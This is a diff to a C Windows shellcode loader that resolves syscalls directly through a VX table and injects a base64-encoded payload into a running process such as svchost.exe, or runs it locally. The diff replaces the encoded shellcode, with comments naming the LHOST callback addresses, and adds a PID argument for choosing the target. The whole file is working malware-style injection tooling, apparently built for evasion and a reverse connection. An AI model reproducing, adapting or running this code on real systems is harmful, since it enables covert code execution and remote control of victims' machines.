@@ -172,10 +172,9 @@ BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDire
 	return TRUE;
 }
 
-
-DWORD GetProcessByName(const wchar_t* name)
+int GetProcessByName(const wchar_t* name)
 {
-	DWORD pid = 0;
+	int pid = 0;
 
 	// Create toolhelp snapshot.
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -213,7 +212,8 @@ DWORD GetProcessByName(const wchar_t* name)
 /***************************************/
 /* Experimenting with Process Injection*/
 /***************************************/
-BOOL Inject(PVX_TABLE pVxTable,  const char* processname) {
+BOOL Inject(PVX_TABLE pVxTable,  const char* processname, int pid) {
+
 	//char* shellcode;
 	NTSTATUS status;
 	HANDLE targetHandle, sectionHandle;
@@ -221,11 +221,13 @@ BOOL Inject(PVX_TABLE pVxTable,  const char* processname) {
 	PVOID remoteSectionAddress = NULL;
 
 
+	//  LHOST=192.168.49.179
+	//char shellcode[601] = "";
+	//char* encoded = "rz3z14K7/2NyMzVwEiUie0OBYgY6uCZBBT37YWobuDFSe/9TAzhB+jpchCk4e0Xh/0kRT3B/EyKz+nlgUrSS3iASYiv5YVSqEUk4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4zP5e2xl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G22xyM3QQakdeAkRrHVdLHUUWanUqe/uSeqSyiHUhUzhB+iEAWWAhes522uq2M3JTM5yn21ohU3VfQkNrawIUQU1JCgcReQYgWBYQXhdDAh8BXRY1Rgg6Sj5mERQZAiA9RSYEVSEhG/yxYCgSay5D+idp63VCm/ZTM2NyYydyGrKy2Cd9CJyne/3nOX8ve/uiWXwoYRyhYHVwevuzWWczaj2bJjPutXJTM2ON5jkQkyYqe/uiflK7fkXoACY59LB+NXsJzKGkkwBve7WSu3ByMz2bF4VF03JTM2ON5jzenAFy2Ni7ZmNyMyd4OTUqevuC8oFierPhU2VwMzvpa8ch1nQhU3WP5jrAYDA6upNp2oQ4uqga9KNyE3QhGvyJeshBpeqQM3QhU4qle/GXE+ayR8ZH2HI4MrHW8xaga7d5OXUpiJJOGWkzuq7ehg==";
 
-	// LHOST=192.168.1.166
-	// Lengh 667
-	char shellcode[667] = "";
-	char* encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";
+	//  LHOST=192.168.49.58
+	char shellcode[591] = "";
+	char* encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSe/9TAz1/hDgZflK7e0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdG3SgVfMrK2hwciUu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4e3OFflK7e0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzV5G3SgcioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVdLHUEZUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaFnQhU1oXBBpmQhAZQARHJzkEdgNheCEaQR1gfhIheTcnexklYxAQJXU4urMAaSIqfkXoAD3IM0D7t2NyM3RxACY59LC4Zk1JzKFp2rMaOS0bupIYLC5zO/VDM3IauoMYNzV4Gs8FdezVM2NyM4v0HkSwYCgbupI/Ar1sYrwjYDuU8U50Kw/ehvCwRm0b9KL6IHQhGs80w0ezM2NyM4v0G4q/R3C4mYsnM3QhACwacygaurKz0WRolLVwI3JTetkqlyfEU3VwM42Ge/AhYDyotD35wjra6Sq183QBU3U5uosaiXHkupYhU3VwzKcbsKdStrRV4RP7NDpS8OayRqZ5kC0aMyvo035YOTWoiYql";
 
 
 	printf("[+] Decoding b64 payload...\n");
@@ -290,12 +292,14 @@ BOOL Inject(PVX_TABLE pVxTable,  const char* processname) {
 	}
 	*/
 
-	//processname es char*, y no vale. Se incluye el nombre hardcodeado
-	wchar_t* pname = L"explorer.exe";
-
-	int pid = GetProcessByName(pname);
-	printf("[+] Found PID of %ls: %d\n", pname, pid);
-
+	if (!pid) {
+		//processname es char*, y no vale. Se incluye el nombre hardcodeado
+		//wchar_t* pname = L"explorer.exe";
+		wchar_t* pname = L"svchost.exe";
+		//wchar_t* pname = L"notepad.exe";
+		pid = GetProcessByName(pname);
+		printf("[+] Found PID of %ls: %d\n", pname, pid);
+	}
 	//Open victim process (NtOpenProcess)
 	OBJECT_ATTRIBUTES objAttr;
 	CLIENT_ID cID;
@@ -351,12 +355,16 @@ BOOL Payload(PVX_TABLE pVxTable) {
 	NTSTATUS status = 0x00000000;
 
 
-	// LHOST=192.168.1.166
-	// Lengh 667
-	char shellcode[667] = "";
-	char* encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";
 
-//unsigned char encrypted[]="";
+	//  LHOST=192.168.49.179
+	//char shellcode[601] = "";
+	//char* encoded = "rz3z14K7/2NyMzVwEiUie0OBYgY6uCZBBT37YWobuDFSe/9TAzhB+jpchCk4e0Xh/0kRT3B/EyKz+nlgUrSS3iASYiv5YVSqEUk4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4zP5e2xl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G22xyM3QQakdeAkRrHVdLHUUWanUqe/uSeqSyiHUhUzhB+iEAWWAhes522uq2M3JTM5yn21ohU3VfQkNrawIUQU1JCgcReQYgWBYQXhdDAh8BXRY1Rgg6Sj5mERQZAiA9RSYEVSEhG/yxYCgSay5D+idp63VCm/ZTM2NyYydyGrKy2Cd9CJyne/3nOX8ve/uiWXwoYRyhYHVwevuzWWczaj2bJjPutXJTM2ON5jkQkyYqe/uiflK7fkXoACY59LB+NXsJzKGkkwBve7WSu3ByMz2bF4VF03JTM2ON5jzenAFy2Ni7ZmNyMyd4OTUqevuC8oFierPhU2VwMzvpa8ch1nQhU3WP5jrAYDA6upNp2oQ4uqga9KNyE3QhGvyJeshBpeqQM3QhU4qle/GXE+ayR8ZH2HI4MrHW8xaga7d5OXUpiJJOGWkzuq7ehg==";
+
+	//  LHOST=192.168.49.58
+	char shellcode[591] = "";
+	char* encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSe/9TAz1/hDgZflK7e0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdG3SgVfMrK2hwciUu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4e3OFflK7e0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzV5G3SgcioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVdLHUEZUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaFnQhU1oXBBpmQhAZQARHJzkEdgNheCEaQR1gfhIheTcnexklYxAQJXU4urMAaSIqfkXoAD3IM0D7t2NyM3RxACY59LC4Zk1JzKFp2rMaOS0bupIYLC5zO/VDM3IauoMYNzV4Gs8FdezVM2NyM4v0HkSwYCgbupI/Ar1sYrwjYDuU8U50Kw/ehvCwRm0b9KL6IHQhGs80w0ezM2NyM4v0G4q/R3C4mYsnM3QhACwacygaurKz0WRolLVwI3JTetkqlyfEU3VwM42Ge/AhYDyotD35wjra6Sq183QBU3U5uosaiXHkupYhU3VwzKcbsKdStrRV4RP7NDpS8OayRqZ5kC0aMyvo035YOTWoiYql";
+
+	//unsigned char encrypted[]="";
 
 	printf("[+] Decoding b64 payload...\n");
 	int result = Base64decode((char*)shellcode, encoded);
@@ -426,7 +434,11 @@ PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
 
 int main(int argc, const char* argv[]) {
 	const char* processname = L"";
+	int pid=0;
 
+	if (argc > 2) {
+		pid = atoi(argv[2]);
+	}
 	if (argc > 1) {
 		processname = argv[1];
 	}
@@ -515,13 +527,19 @@ int main(int argc, const char* argv[]) {
 
 
 	//Injecting shellcode in other process
-	if (argc > 1) {
-		printf("[+] Performing attack (remote thread). Injecting into %s\n",processname);
-		Inject(&Table, processname);
+	if (argc > 2) {
+		printf("[+] Performing attack (remote thread). Injecting into pid %d\n", pid);
+		Inject(&Table, processname, pid);
 	}
 	else {
-		printf("[+]Performing attack (local thread)\n");
-		Payload(&Table);
+		if (argc > 1) {
+			printf("[+] Performing attack (remote thread). Injecting into %s\n",processname);
+			Inject(&Table, processname,pid);
+		}
+		else {
+			printf("[+]Performing attack (local thread)\n");
+			Payload(&Table);
+		}
 	}
 	return 0x00;
 }
